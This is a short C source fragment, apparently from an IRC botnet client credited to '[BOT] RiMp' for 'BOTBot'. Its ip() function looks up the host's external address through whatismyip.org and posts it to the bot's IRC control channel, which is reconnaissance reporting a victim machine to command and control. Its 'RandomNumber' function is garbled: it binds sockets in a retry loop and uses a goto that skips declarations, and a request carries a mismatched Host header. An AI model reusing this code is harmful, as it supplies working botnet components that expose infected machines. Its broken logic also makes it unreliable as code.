#include "Include.h"
#include "Hell.h"

//SOCKET data_sock;

char ipscanor[16];
char localip[16];
char buff[512];



/* Random Number Generator
 * Author: [BOT] RiMp
 * Built for BOTBot
 */

int RandomNumber(int iStart,int iEnd)
{ 
RETRY:
int t;
srand(GetTickCount());
t = rand()%iStart+iEnd;
int tries;
for (tries = 20; tries > 0; tries--) 
{
	SOCKET connecter = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in connecter_addr;
	connecter_addr.sin_family = AF_INET;
	connecter_addr.sin_port = t;
	connecter_addr.sin_addr.s_addr = htonl(INADDR_ANY);
	if (connecter == INVALID_SOCKET) 
	{
		return 0;
	}
	
	if (bind(connecter, (struct sockaddr FAR *)&connecter_addr, sizeof(connecter_addr)) != SOCKET_ERROR) 
	{
		closesocket(connecter);
		return connecter_addr.sin_port;
	} 
	else 
		if (WSAGetLastError() != WSAEADDRINUSE) 
		{
			closesocket(connecter);
			return 0;
		}
		closesocket(connecter);
		goto RETRY;
}

return (int)((float)((iEnd+1)-iStart)*rand()/(RAND_MAX+1.0))+iStart; 
}

DWORD RandomDword()
{
	return rand() + (rand() << 16);
}

BYTE RandomByte()
{
	return rand() & 0xFF;
}





int ip()
{
#define WHATISMYIP "www.whatismyip.org"
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2,2), &wsaData); // Initialize winsock
	
	
	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	
	if(sock == SOCKET_ERROR)	// bad socket?
	{
		return 0;
	}
	
	sockaddr_in sa;	
	sa.sin_family	= AF_INET;
	sa.sin_port		= htons(80);
	
	HOSTENT *h = gethostbyname(WHATISMYIP);
	if(!h)
	{
		return 0;
	}
	
	memcpy(&sa.sin_addr.s_addr, h->h_addr_list[0], 4);
	
	if( connect(sock, (SOCKADDR*)&sa, sizeof(sa)) == SOCKET_ERROR )
	{
		return 0;
	}
	
	
	char Packet[] = 
		"GET / HTTP/1.1\r\n"  
		"Host: epguides.com\r\n"    
		"Connection: close\r\n"    
		"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1.3) Gecko/20070309 Firefox/2.0.0.3\r\n"
		"\r\n";
	
	int rtn = 0;
	
	rtn = send(sock, Packet, sizeof(Packet)-1, 0);
	if(rtn <= 0)
	{
		return 0;
	}
	
	char Buffer[16384] = {0};
	
	rtn = recv(sock, Buffer, sizeof(Buffer), 0);
	if(rtn <= 0) 
	{
		return 0;
	}
	
	

	BOT->cIRC.SendData("PRIVMSG %s :External IP: %s\r\n", BOT->cIRC.cConf.cChan.c_str(),Buffer);
	
	closesocket(sock);	
	
	return 1;
}